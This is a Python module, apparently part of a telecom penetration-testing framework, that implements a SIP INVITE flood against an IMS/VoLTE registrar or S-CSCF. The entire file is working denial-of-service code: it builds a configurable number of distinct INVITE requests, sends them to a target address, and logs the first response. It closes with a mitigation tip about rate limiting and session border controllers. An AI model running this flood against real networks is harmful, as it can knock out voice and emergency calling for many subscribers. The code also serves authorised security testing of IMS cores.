#!/usr/bin/env python3
'''
SIP INVITE Flood (IMS/VoLTE access layer Denial of Service).

Floods the target registrar/S-CSCF with unique (distinct Call-ID/branch)
INVITE requests to exhaust call-state/session resources - the SIP analogue of
the GTP massive-DoS and PFCP session-establishment flood attacks.

    main(config_file, target, listening, verbosity, output_file)
'''
from sip.sip_core.sip_config_parser import SipConfig
from sip.sip_core.sip_message import build_request
from sip.sip_core.sip_transport import send, probe
from sip.commons.utilities import logOk, logErr, logWarn, logInfo, logNormal

TAG = 'SIP-INVITE-FLOOD'


def main(config_file, target, listening=True, verbosity=2, output_file=None):
    if not target:
        logErr('No target set. Use "set target <s-cscf-ip>".', TAG=TAG)
        return
    try:
        cfg = SipConfig(config_file)
    except Exception as e:
        logErr('Bad config: %s' % e, TAG=TAG)
        return

    verbose = verbosity >= 2
    to_uri = 'sip:%s@%s' % (cfg.to_user, cfg.domain)
    from_uri = 'sip:%s@%s' % (cfg.from_user, cfg.domain)
    count = max(1, cfg.count)

    logWarn('INVITE flood: %d message(s) -> %s:%d' % (count, target, cfg.port),
            TAG=TAG)

    sent = 0
    first_status = None
    for i in range(count):
        req = build_request(
            'INVITE', to_uri, from_uri, to_uri, cfg.local_host,
            local_port=cfg.local_port or 5060,
            contact='sip:%s@%s:%d' % (cfg.from_user, cfg.local_host,
                                       cfg.local_port or 5060))
        if i == 0:
            resp = probe(target, cfg.port, req, timeout=cfg.timeout)
            sent += 1
            if resp is not None:
                first_status = resp['status_code']
                logOk('Target replied to first INVITE: %d %s'
                      % (resp['status_code'], resp['reason']), TAG=TAG)
            else:
                logNormal('no reply to first INVITE', verbose=verbose, TAG=TAG)
        else:
            sent += 1 if send(target, cfg.port, req.get_message()) else 0
            logNormal('sent INVITE #%d' % (i + 1), verbose=verbose, TAG=TAG)

    logInfo('Done: %d INVITE(s) sent to %s:%d.' % (count, target, cfg.port), TAG=TAG)
    logWarn('Recommendation: rate-limit INVITE per source, require registration/'
            'authentication before call setup, and enforce a P-CSCF-level flood '
            'protection (SBC) in front of the IMS core.', TAG=TAG)
    return {'sent': sent, 'first_status': first_status}
